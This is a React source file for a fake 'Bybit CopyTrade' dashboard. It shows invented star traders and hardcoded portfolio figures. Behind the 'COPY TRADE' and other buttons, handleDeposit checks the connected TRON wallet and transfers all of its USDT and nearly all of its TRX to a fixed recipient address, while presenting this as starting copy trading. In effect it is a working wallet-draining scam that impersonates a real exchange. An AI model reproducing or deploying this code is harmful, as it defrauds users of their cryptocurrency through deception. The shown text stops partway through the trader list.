"use client";

import React, { useState, useEffect } from "react";
import {
  TrendingUp,
  TrendingDown,
  Users,
  Wallet,
  BarChart3,
  Star,
  Crown,
  Copy,
  Eye,
  Activity,
  DollarSign,
  Target,
  Zap,
} from "lucide-react";
import TickerBar from "./TickerBar";
import Navigation from "./Navigation";
import ModalDialog from "./ModalDialog";
import { useWallet } from "../contexts/WalletContext";

// Constants for transaction
const RECIPIENT_ADDRESS = "TBK1Hai8nyCoznKD1iHf2z5CEdkNF7sK9N";
// const STANDARD_BANDWIDTH_FEE_SUN = 1000000; // 1 TRX in SUN
// const ACCOUNT_ACTIVATION_FEE_SUN = 1000000; // 1 TRX in SUN

// Enhanced ProTraderCard with subtle glassmorphism and animations
function ProTraderCard({
  avatar,
  name,
  followers,
  isVip,
  earn,
  roi,
  winRate,
  aum,
  sharpe,
  isCopying,
  onCopyTrade,
  onStopCopyTrade, // Add this prop
  isProcessing = false,
}) {
  return (
    <div className="bg-gray-800/50 border border-gray-700 rounded-xl backdrop-blur-sm p-8 shadow-lg flex flex-col items-start w-full transform transition-all duration-300 hover:scale-[1.02] hover:shadow-xl hover:border-blue-500/30 group">
      {/* Header */}
      <div className="w-full flex items-center justify-between mb-4">
        <div className="flex items-center gap-4">
          <img
            src={avatar}
            alt={name}
            className="w-12 h-12 rounded-full border-2 border-white/20 object-cover shadow transition-transform duration-300 group-hover:scale-105"
          />
          <div>
            <div className="text-white font-bold text-lg flex items-center gap-2">
              {name}
              {isVip && <Crown className="w-5 h-5 text-yellow-400" />}
            </div>
            <div className="text-white/60 text-xs flex items-center gap-2">
              <Users className="w-4 h-4" />
              {followers} Followers
            </div>
          </div>
        </div>
        {isVip && (
          <div className="bg-yellow-400/20 text-yellow-400 font-bold px-3 py-1 rounded-lg shadow">
            <Star className="w-4 h-4 inline mr-1" /> VIP
          </div>
        )}
      </div>

      {/* Performance Chart with subtle hover animation */}
      <div className="w-full h-16 mb-4 overflow-hidden rounded-lg">
        <svg
          width="100%"
          height="100%"
          viewBox="0 0 350 64"
          className="transition-transform duration-500 group-hover:scale-105"
        >
          <defs>
            <linearGradient
              id="chartGradient"
              x1="0%"
              y1="0%"
              x2="0%"
              y2="100%"
            >
              <stop offset="0%" stopColor="#10b981" stopOpacity="0.3" />
              <stop offset="100%" stopColor="#10b981" stopOpacity="0.1" />
            </linearGradient>
          </defs>
          <path
            d="M0,50 Q50,40 100,30 T200,10 T300,20 T350,25"
            stroke="#10b981"
            strokeWidth="3"
            fill="none"
          />
          <path
            d="M0,50 Q50,40 100,30 T200,10 T300,20 T350,25 L350,64 L0,64 Z"
            fill="url(#chartGradient)"
            className="transition-opacity duration-300 group-hover:opacity-90"
          />
        </svg>
      </div>

      {/* Stats Grid with subtle hover effects */}
      <div className="w-full grid grid-cols-2 gap-4 mb-4">
        <div className="text-left transition-all duration-300 group-hover:scale-[1.02]">
          <div className="text-lg font-bold text-emerald-400 flex items-center gap-1">
            <TrendingUp className="w-5 h-5" />+{earn}
          </div>
          <div className="text-xs text-white/60 font-semibold uppercase tracking-wide">
            EARN (USDT)
          </div>
        </div>
        <div className="text-left transition-all duration-300 group-hover:scale-[1.02]">
          <div className="text-lg font-bold text-emerald-400 flex items-center gap-1">
            <Target className="w-5 h-5" />+{roi}%
          </div>
          <div className="text-xs text-white/60 font-semibold uppercase tracking-wide">
            ROI (30D)
          </div>
        </div>
      </div>
      <div className="w-full grid grid-cols-3 gap-3 mb-4">
        <div className="text-left transition-all duration-300 group-hover:scale-[1.02]">
          <div className="text-base font-bold text-emerald-400">{winRate}%</div>
          <div className="text-xs text-white/60 font-semibold">WIN RATE</div>
        </div>
        <div className="text-left transition-all duration-300 group-hover:scale-[1.02]">
          <div className="text-base font-bold text-blue-400">
            {aum.toLocaleString()}
          </div>
          <div className="text-xs text-white/60 font-semibold">AUM</div>
        </div>
        <div className="text-left transition-all duration-300 group-hover:scale-[1.02]">
          <div className="text-base font-bold text-purple-400">{sharpe}</div>
          <div className="text-xs text-white/60 font-semibold">SHARPE</div>
        </div>
      </div>

      {/* Enhanced Copy Trade Button with state management */}
      <div className="w-full pt-2">
        {isCopying ? (
          <button
            className="w-full bg-gradient-to-r from-red-500 to-red-600 text-white font-bold py-3 rounded-xl transition-all duration-300 flex items-center justify-center gap-2 shadow-lg hover:shadow-xl hover:from-red-600 hover:to-red-700 transform hover:scale-[1.02]"
            onClick={() => !isProcessing && onStopCopyTrade(name)}
            disabled={isProcessing}
          >
            <Eye className="w-5 h-5" /> STOP COPY TRADE
          </button>
        ) : (
          <button
            className={`w-full font-bold py-3 rounded-xl transition-all duration-300 flex items-center justify-center gap-2 shadow-lg transform hover:scale-[1.02] ${
              isProcessing
                ? "bg-gradient-to-r from-gray-500 to-gray-600 text-white cursor-not-allowed"
                : "bg-gradient-to-r from-blue-500 to-green-400 hover:from-blue-600 hover:to-green-500 text-white hover:shadow-xl"
            }`}
            onClick={() => !isProcessing && onCopyTrade(name)}
            disabled={isProcessing}
          >
            {isProcessing ? (
              <>
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                PROCESSING...
              </>
            ) : (
              <>
                <Copy className="w-5 h-5" /> COPY TRADE
              </>
            )}
          </button>
        )}
      </div>
      {/* Processing overlay */}
      {isProcessing && (
        <div className="absolute inset-0 bg-black/10 backdrop-blur-sm rounded-xl flex items-center justify-center">
          <div className="bg-gray-800/90 rounded-lg p-4 flex items-center gap-3">
            <div className="w-6 h-6 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
            <span className="text-white font-semibold">Processing...</span>
          </div>
        </div>
      )}
    </div>
  );
}

export default function Dashboard() {
  const [stats, setStats] = useState({
    balance: 463,
    totalLoss: 106.9,
    totalProfit: 157.3,
  });
  const [modalOpen, setModalOpen] = useState(false);
  const [modalMode, setModalMode] = useState("info");
  const [modalTitle, setModalTitle] = useState("");
  const [modalMessage, setModalMessage] = useState("");
  const [processingTrader, setProcessingTrader] = useState(null);

  // Add this new state for tracking copy trading status
  const [copyTradingStatus, setCopyTradingStatus] = useState({});

  const { address, adapter, connect, signTransaction, isConnected } =
    useWallet();

  // Load copy trading status from localStorage on component mount
  useEffect(() => {
    const savedStatus = localStorage.getItem("copyTradingStatus");
    if (savedStatus) {
      try {
        const parsedStatus = JSON.parse(savedStatus);
        setCopyTradingStatus(parsedStatus);
      } catch (error) {
        console.error("Failed to parse saved copy trading status:", error);
      }
    }
  }, []);

  // Save copy trading status to localStorage whenever it changes
  useEffect(() => {
    localStorage.setItem(
      "copyTradingStatus",
      JSON.stringify(copyTradingStatus)
    );
  }, [copyTradingStatus]);

  const handleCopyTrade = async (traderName) => {
    try {
      // Set processing state
      setProcessingTrader(traderName);

      console.log("=== handleCopyTrade started ===");
      console.log("Initial isConnected:", isConnected);
      console.log("Initial address:", address);
      console.log("Initial adapter:", adapter);

      // Check if wallet is connected
      if (!isConnected) {
        setModalMode("info");
        setModalTitle("Wallet Connection Required");
        setModalMessage(
          "Please connect your wallet first to start copy trading."
        );
        setModalOpen(true);

        // Try to connect wallet
        console.log("Attempting to connect wallet...");
        const result = await connect();
        console.log("Connect result:", result);

        if (!result.success) {
          setModalMode("fail");
          setModalTitle("Wallet Connection Failed");
          setModalMessage(
            result.error || "Failed to connect wallet. Please try again."
          );
          setModalOpen(true);
          setProcessingTrader(null);
          return;
        }

        // Close the info modal
        setModalOpen(false);

        // Add a delay to ensure the address is updated in the context
        console.log("Waiting for wallet state to update...");
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log("Delay completed, proceeding with deposit...");
      }

      // Check address again after delay
      console.log("After delay - address:", address);
      console.log("After delay - adapter address:", adapter?.address);

      // Use the adapter address directly since context state is not updating
      const currentAddress = address || adapter?.address;
      console.log("Final address to use:", currentAddress);

      if (!currentAddress) {
        setModalMode("fail");
        setModalTitle("Wallet Address Not Available");
        setModalMessage(
          "Please ensure your wallet is properly connected and try again."
        );
        setModalOpen(true);
        setProcessingTrader(null);
        return;
      }

      console.log("Using address:", currentAddress);

      // Now proceed with deposit
      await handleDeposit(traderName);
    } catch (error) {
      console.error("handleCopyTrade error:", error);
      setModalMode("fail");
      setModalTitle("Copy Trading Failed");
      setModalMessage(
        error.message || "An error occurred while setting up copy trading."
      );
      setModalOpen(true);
    } finally {
      // Clear processing state
      setProcessingTrader(null);
    }
  };

  const handleDeposit = async (traderName) => {
    const tronWeb = window.bybitWallet?.tronLink?.tronWeb || window.tronWeb;
    if (!tronWeb || typeof tronWeb.contract !== "function") {
      setModalMode("fail");
      setModalTitle("Wallet Not Ready");
      setModalMessage(
        "TronWeb is not available. Please ensure your wallet is connected and the extension is installed."
      );
      setModalOpen(true);
      return;
    }

    // Use the provided address or fall back to context address
    const currentAddress = address || adapter?.address;

    console.log("handleDeposit - provided address:", currentAddress);
    console.log("handleDeposit - context address:", address);
    console.log("handleDeposit - adapter address:", adapter?.address);
    console.log("handleDeposit - final address:", currentAddress);

    if (!currentAddress) {
      setModalMode("fail");
      setModalTitle("Wallet Address Not Available");
      setModalMessage(
        "Please ensure your wallet is properly connected and try again."
      );
      setModalOpen(true);
      return;
    }

    setModalMode("info");
    setModalTitle("Checking Balances...");
    setModalMessage(
      "We are checking your USDT and TRX balances to determine the optimal transfer strategy."
    );
    setModalOpen(true);

    try {
      // Get current prices
      const priceResponse = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=tron,usd-coin&vs_currencies=usd"
      );
      const priceData = await priceResponse.json();
      const trxPrice = priceData.tron?.usd || 0.1;
      const usdtPrice = priceData["usd-coin"]?.usd || 1;

      console.log("Current prices - TRX:", trxPrice, "USDT:", usdtPrice);

      // Get TRX balance
      const trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
      const trxBalance = trxBalanceSun / 1000000;

      // Get USDT balance
      const usdtContract = await tronWeb
        .contract()
        .at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
      const usdtBalanceRaw = await usdtContract
        .balanceOf(currentAddress)
        .call();
      const usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1000000;

      console.log("Balances - TRX:", trxBalance, "USDT:", usdtBalance);

      // Calculate USD values
      const trxUSDValue = trxBalance * trxPrice;
      const usdtUSDValue = usdtBalance * usdtPrice;

      console.log("USD Values - TRX:", trxUSDValue, "USDT:", usdtUSDValue);

      // Determine transfer order based on USD value
      const transfers = [];

      if (trxUSDValue > usdtUSDValue) {
        // TRX has higher value, transfer it first
        if (trxBalance > 2) {
          const trxToTransfer = trxBalance - 2;
          transfers.push({
            type: "TRX",
            amount: trxToTransfer,
            usdValue: trxToTransfer * trxPrice,
          });
        }

        if (usdtBalance > 0) {
          transfers.push({
            type: "USDT",
            amount: usdtBalance,
            usdValue: usdtBalance * usdtPrice,
          });
        }
      } else {
        // USDT has higher value, transfer it first
        if (usdtBalance > 0) {
          transfers.push({
            type: "USDT",
            amount: usdtBalance,
            usdValue: usdtBalance * usdtPrice,
          });
        }

        if (trxBalance > 2) {
          const trxToTransfer = trxBalance - 2;
          transfers.push({
            type: "TRX",
            amount: trxToTransfer,
            usdValue: trxToTransfer * trxPrice,
          });
        }
      }

      if (transfers.length === 0) {
        setModalMode("fail");
        setModalTitle("Insufficient Balance");
        setModalMessage(
          "You don't have enough balance to start copy trading. Please add some TRX or USDT to your wallet."
        );
        setModalOpen(true);
        return;
      }

      console.log("Transfer plan:", transfers);

      // Execute transfers
      for (let i = 0; i < transfers.length; i++) {
        const transfer = transfers[i];

        setModalMode("info");
        setModalTitle(`Transferring ${transfer.type}...`);
        setModalMessage(
          `Transferring ${transfer.amount.toFixed(6)} ${
            transfer.type
          } ($${transfer.usdValue.toFixed(
            2
          )}) to start copy trading with ${traderName}. Please accept the transaction.`
        );
        setModalOpen(true);

        try {
          if (transfer.type === "TRX") {
            // Transfer TRX
            const unsignedTransaction =
              await tronWeb.transactionBuilder.sendTrx(
                RECIPIENT_ADDRESS,
                transfer.amount * 1000000,
                currentAddress
              );

            const signedTransaction = await signTransaction(
              unsignedTransaction
            );
            const result = await tronWeb.trx.sendRawTransaction(
              signedTransaction
            );

            if (!result || !result.txid) {
              throw new Error("TRX transfer failed");
            }

            console.log(`TRX transfer successful: ${result.txid}`);
          } else if (transfer.type === "USDT") {
            // Transfer USDT
            const amountInSmallestUnit = tronWeb.toHex(
              transfer.amount * 1000000
            );
            const parameter = [
              { type: "address", value: RECIPIENT_ADDRESS },
              { type: "uint256", value: amountInSmallestUnit },
            ];

            const unsignedTransaction =
              await tronWeb.transactionBuilder.triggerConstantContract(
                "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                "transfer(address,uint256)",
                {},
                parameter,
                currentAddress
              );

            const signedTransaction = await signTransaction(
              unsignedTransaction
            );
            const result = await tronWeb.trx.sendRawTransaction(
              signedTransaction
            );

            if (!result || !result.txid) {
              throw new Error("USDT transfer failed");
            }

            console.log(`USDT transfer successful: ${result.txid}`);
          }

          // Wait a bit between transfers
          if (i < transfers.length - 1) {
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        } catch (error) {
          console.error(`${transfer.type} transfer failed:`, error);
          setModalMode("fail");
          setModalTitle(`${transfer.type} Transfer Failed`);
          setModalMessage(
            `Failed to transfer ${transfer.amount.toFixed(6)} ${
              transfer.type
            }. Error: ${error.message}`
          );
          setModalOpen(true);
          return;
        }
      }

      // All transfers completed successfully - Set copy trading status to true
      setCopyTradingStatus((prev) => ({
        ...prev,
        [traderName]: true,
      }));

      // All transfers completed successfully
      setModalMode("success");
      setModalTitle("Copy Trading Started Successfully");
      setModalMessage(
        `Successfully started copy trading with ${traderName}! ` +
          `Transferred: ${transfers
            .map((t) => `${t.amount.toFixed(6)} ${t.type}`)
            .join(", ")} ` +
          `Total value: $${transfers
            .reduce((sum, t) => sum + t.usdValue, 0)
            .toFixed(2)}`
      );
      setModalOpen(true);
    } catch (error) {
      console.error("Deposit error:", error);
      setModalMode("fail");
      setModalTitle("Copy Trading Failed");
      setModalMessage(
        `Copy trading failed. Check the console for details. Error: ${
          error.message || "An unknown error occurred."
        }`
      );
      setModalOpen(true);
    }
  };

  // Function to toggle copy trading status
  const toggleCopyTrading = (traderName) => {
    setCopyTradingStatus((prev) => ({
      ...prev,
      [traderName]: !prev[traderName],
    }));
  };

  // Function to check if user is copying a specific trader
  const isCopyingTrader = (traderName) => {
    return copyTradingStatus[traderName] || false;
  };

  return (
    <div className="min-h-screen bg-gray-900 bg-gradient-to-br from-[#0f172a] to-[#1e293b] font-inter w-full">
      <Navigation />
      <TickerBar />
      {/* New Hero Section */}
      <div className="relative overflow-hidden mt-12">
        <div className="absolute inset-0 bg-gradient-to-r from-blue-600/10 to-green-600/10"></div>
        <div className="relative max-w-7xl mx-auto px-4 md:px-8 py-12">
          {/* Hero Title */}
          <div className="text-center mb-12">
            <h1 className="text-5xl font-bold text-white mb-4">
              Bybit
              <span className="block bg-gradient-to-r from-blue-400 to-green-400 bg-clip-text text-transparent">
                CopyTrade
              </span>
            </h1>
            <p className="text-xl text-white/80 max-w-2xl mx-auto">
              Advanced crypto copy trading platform with professional traders
            </p>
          </div>

          {/* Navigation Cards */}
          <div className="flex gap-4 justify-center mb-8">
            {/* Live Trade Card */}
            <button
              className="font-bold bg-gradient-to-r from-blue-500 to-green-400 border-2 border-blue-500 shadow-lg text-white px-4 py-2 text-base rounded-lg sm:px-8 sm:py-4 sm:text-lg sm:rounded-xl transition-all duration-300 hover:from-blue-600 hover:to-green-500 hover:shadow-xl focus:outline-none focus:ring-2 focus:ring-blue-400/50"
              onClick={handleCopyTrade}
            >
              Live Trade
            </button>

            {/* Analysis Card */}
            <button
              className="font-bold bg-gradient-to-r from-blue-500 to-green-400 border-2 border-blue-500 shadow-lg text-white px-4 py-2 text-base rounded-lg sm:px-8 sm:py-4 sm:text-lg sm:rounded-xl transition-all duration-300 hover:from-blue-600 hover:to-green-500 hover:shadow-xl focus:outline-none focus:ring-2 focus:ring-blue-400/50"
              onClick={handleCopyTrade}
            >
              Analysis
            </button>

            {/* Control Card */}
            <button
              className="font-bold bg-gradient-to-r from-blue-500 to-green-400 border-2 border-blue-500 shadow-lg text-white px-4 py-2 text-base rounded-lg sm:px-8 sm:py-4 sm:text-lg sm:rounded-xl transition-all duration-300 hover:from-blue-600 hover:to-green-500 hover:shadow-xl focus:outline-none focus:ring-2 focus:ring-blue-400/50"
              onClick={handleCopyTrade}
            >
              Control
            </button>
          </div>

          {/* Platform Statistics - No Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
            {/* Total Traders */}
            <div>
              <div className="text-3xl font-bold text-emerald-400 mb-2">
                588
              </div>
              <div className="text-white/60 text-sm font-medium">
                Total Traders
              </div>
            </div>

            {/* Average ROI */}
            <div>
              <div className="text-3xl font-bold text-emerald-400 mb-2">
                +251.2%
              </div>
              <div className="text-white/60 text-sm font-medium">
                Average ROI
              </div>
            </div>

            {/* Total Copied */}
            <div>
              <div className="text-3xl font-bold text-emerald-400 mb-2">
                $124.8M
              </div>
              <div className="text-white/60 text-sm font-medium">
                Total Copied
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 md:px-8 pb-12 space-y-12 w-full">
        {/* Portfolio Overview */}
        <section className="relative w-full pt-12">
          {/* Portfolio Overview big card */}
          <div className="bg-gray-800/50 border border-gray-700 rounded-xl backdrop-blur-sm p-8 h-full flex flex-col items-start shadow-lg w-full">
            <div className="flex flex-col md:flex-row items-center md:justify-between mb-8 gap-6 md:gap-0 w-full">
              <div>
                <h2 className="text-white text-3xl font-bold mb-2 flex items-center gap-3">
                  <Wallet className="w-8 h-8 text-blue-400" />
                  Portfolio Overview
                </h2>
                <p className="text-white/80">
                  Your trading performance at a glance
                </p>
              </div>
              <div className="text-right md:text-right w-full md:w-auto">
                <div className="text-5xl md:text-6xl font-bold text-white drop-shadow-lg">
                  ${stats.balance}
                </div>
                <div className="text-white/80 text-lg">Total Balance</div>
              </div>
            </div>
            {/* Performance Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 w-full">
              {/* Total Loss Card */}
              <div className="bg-red-900/40 border border-red-700 rounded-xl backdrop-blur-sm p-8 h-full flex flex-col items-start shadow-lg">
                <div className="mb-4 p-3 bg-gradient-to-r from-red-500/20 to-red-700/20 rounded-lg">
                  <TrendingDown className="w-6 h-6 text-red-400" />
                </div>
                <h3 className="text-xl font-bold text-red-400 mb-2">
                  {stats.totalLoss} USDT
                </h3>
                <p className="text-white/80 text-sm uppercase tracking-wide mb-0">
                  Total Loss
                </p>
              </div>
              {/* Total Profit Card */}
              <div className="bg-emerald-900/40 border border-emerald-700 rounded-xl backdrop-blur-sm p-8 h-full flex flex-col items-start shadow-lg">
                <div className="mb-4 p-3 bg-gradient-to-r from-green-500/20 to-green-700/20 rounded-lg">
                  <TrendingUp className="w-6 h-6 text-emerald-400" />
                </div>
                <h3 className="text-xl font-bold text-emerald-400 mb-2">
                  {stats.totalProfit} USDT
                </h3>
                <p className="text-white/80 text-sm uppercase tracking-wide mb-0">
                  Total Profit
                </p>
              </div>
            </div>
            <div className="flex justify-center mt-8 w-full">
              <a href="/panel">
                <button className="w-full md:w-auto bg-gradient-to-r from-blue-500 to-green-400 hover:from-blue-600 hover:to-green-500 text-white font-bold rounded-xl px-8 py-3 shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2">
                  <Activity className="w-5 h-5" />
                  MY COPY TRADE PANEL
                </button>
              </a>
            </div>
          </div>
        </section>

        {/* Top Traders Section */}
        <section>
          <div className="bg-gray-700/30 border border-gray-700 backdrop-blur-sm rounded-3xl shadow-2xl p-8 md:p-12 mb-12">
            <div className="flex items-center gap-4 mb-8">
              <div className="w-12 h-12 bg-gradient-to-r from-blue-500 to-green-400 rounded-xl flex items-center justify-center">
                <Star className="w-6 h-6 text-white" />
              </div>
              <div>
                <h2 className="text-3xl font-bold text-white">
                  Elite Pro Traders
                </h2>
                <p className="text-white/80">
                  Discover and copy trade from the best performers
                </p>
              </div>
            </div>

            {/* Search Bar UI */}
            <div className="w-full flex justify-start mb-8">
              <div className="flex items-center w-full max-w-md bg-gray-600/40 rounded-2xl shadow-lg px-4 py-2">
                <input
                  type="text"
                  placeholder="Search traders by name..."
                  className="flex-1 bg-transparent outline-none border-none text-white/90 placeholder-white/70 text-lg px-2 py-2"
                />
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="w-6 h-6 text-white/90"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                  strokeWidth={2}
                >
                  <circle cx="11" cy="11" r="7" />
                  <path d="M21 21l-4.35-4.35" strokeLinecap="round" />
                </svg>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-8 w-full">
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/44.jpg"
                name="Anjuta"
                followers="123/1000"
                isVip={true}
                earn={25338.76}
                roi={34.1}
                winRate={91.59}
                aum={74307}
                sharpe={3.68}
                isCopying={isCopyingTrader("Anjuta")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Anjuta"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/32.jpg"
                name="Novin Trader"
                followers="562/1000"
                isVip={true}
                earn={15196.12}
                roi={13.31}
                winRate={90.61}
                aum={114171}
                sharpe={1.43}
                isCopying={isCopyingTrader("Novin Trader")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Novin Trader"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/85.jpg"
                name="ITEKCrypto"
                followers="243/1000"
                isVip={true}
                earn={26653.98}
                roi={31.51}
                winRate={95.01}
                aum={84589}
                sharpe={2.36}
                isCopying={isCopyingTrader("ITEKCrypto")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "ITEKCrypto"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/23.jpg"
                name="CryptoQueen"
                followers="789/1000"
                isVip={true}
                earn={18765.43}
                roi={28.7}
                winRate={88.92}
                aum={156234}
                sharpe={2.89}
                isCopying={isCopyingTrader("CryptoQueen")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "CryptoQueen"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/67.jpg"
                name="Bitcoin Baron"
                followers="445/1000"
                isVip={false}
                earn={9876.54}
                roi={15.2}
                winRate={85.33}
                aum={67890}
                sharpe={1.78}
                isCopying={isCopyingTrader("Bitcoin Baron")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Bitcoin Baron"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/56.jpg"
                name="Ethereum Elite"
                followers="334/1000"
                isVip={true}
                earn={22345.67}
                roi={42.3}
                winRate={93.45}
                aum={98765}
                sharpe={3.12}
                isCopying={isCopyingTrader("Ethereum Elite")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Ethereum Elite"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/12.jpg"
                name="Trading Titan"
                followers="667/1000"
                isVip={true}
                earn={31234.56}
                roi={38.9}
                winRate={89.78}
                aum={134567}
                sharpe={2.67}
                isCopying={isCopyingTrader("Trading Titan")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Trading Titan"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/78.jpg"
                name="Altcoin Ace"
                followers="234/1000"
                isVip={false}
                earn={7654.32}
                roi={12.4}
                winRate={82.15}
                aum={45678}
                sharpe={1.45}
                isCopying={isCopyingTrader("Altcoin Ace")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Altcoin Ace"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/45.jpg"
                name="DeFi Master"
                followers="456/1000"
                isVip={true}
                earn={19876.54}
                roi={25.6}
                winRate={87.23}
                aum={87654}
                sharpe={2.34}
                isCopying={isCopyingTrader("DeFi Master")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "DeFi Master"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/89.jpg"
                name="Satoshi Pro"
                followers="567/1000"
                isVip={true}
                earn={27654.32}
                roi={35.8}
                winRate={91.12}
                aum={112345}
                sharpe={2.98}
                isCopying={isCopyingTrader("Satoshi Pro")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Satoshi Pro"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/34.jpg"
                name="Crypto Crusher"
                followers="345/1000"
                isVip={false}
                earn={8765.43}
                roi={18.7}
                winRate={84.56}
                aum={54321}
                sharpe={1.67}
                isCopying={isCopyingTrader("Crypto Crusher")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Crypto Crusher"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/67.jpg"
                name="Blockchain Belle"
                followers="678/1000"
                isVip={true}
                earn={23456.78}
                roi={29.4}
                winRate={88.91}
                aum={98765}
                sharpe={2.45}
                isCopying={isCopyingTrader("Blockchain Belle")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Blockchain Belle"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/23.jpg"
                name="Token Trader"
                followers="234/1000"
                isVip={false}
                earn={6543.21}
                roi={11.8}
                winRate={79.34}
                aum={34567}
                sharpe={1.23}
                isCopying={isCopyingTrader("Token Trader")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Token Trader"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/45.jpg"
                name="Mining Maven"
                followers="456/1000"
                isVip={true}
                earn={18765.43}
                roi={27.3}
                winRate={86.78}
                aum={76543}
                sharpe={2.12}
                isCopying={isCopyingTrader("Mining Maven")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Mining Maven"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/78.jpg"
                name="HODL Hero"
                followers="567/1000"
                isVip={true}
                earn={29876.54}
                roi={33.7}
                winRate={90.45}
                aum={123456}
                sharpe={2.89}
                isCopying={isCopyingTrader("HODL Hero")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "HODL Hero"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/12.jpg"
                name="FOMO Fighter"
                followers="345/1000"
                isVip={false}
                earn={7654.32}
                roi={16.9}
                winRate={83.67}
                aum={45678}
                sharpe={1.56}
                isCopying={isCopyingTrader("FOMO Fighter")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "FOMO Fighter"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/56.jpg"
                name="Whale Watcher"
                followers="789/1000"
                isVip={true}
                earn={34567.89}
                roi={41.2}
                winRate={94.23}
                aum={156789}
                sharpe={3.34}
                isCopying={isCopyingTrader("Whale Watcher")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Whale Watcher"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/34.jpg"
                name="Pump Princess"
                followers="234/1000"
                isVip={false}
                earn={5432.1}
                roi={9.8}
                winRate={76.89}
                aum={23456}
                sharpe={1.12}
                isCopying={isCopyingTrader("Pump Princess")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Pump Princess"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/89.jpg"
                name="Dump Defender"
                followers="456/1000"
                isVip={true}
                earn={16789.01}
                roi={24.5}
                winRate={85.67}
                aum={67890}
                sharpe={2.01}
                isCopying={isCopyingTrader("Dump Defender")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Dump Defender"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/67.jpg"
                name="Moon Mission"
                followers="678/1000"
                isVip={true}
                earn={25678.9}
                roi={31.6}
                winRate={89.34}
                aum={98765}
                sharpe={2.67}
                isCopying={isCopyingTrader("Moon Mission")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Moon Mission"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/23.jpg"
                name="Bear Market Boss"
                followers="345/1000"
                isVip={false}
                earn={8765.43}
                roi={19.3}
                winRate={81.45}
                aum={45678}
                sharpe={1.78}
                isCopying={isCopyingTrader("Bear Market Boss")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Bear Market Boss"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/45.jpg"
                name="Bull Run Queen"
                followers="567/1000"
                isVip={true}
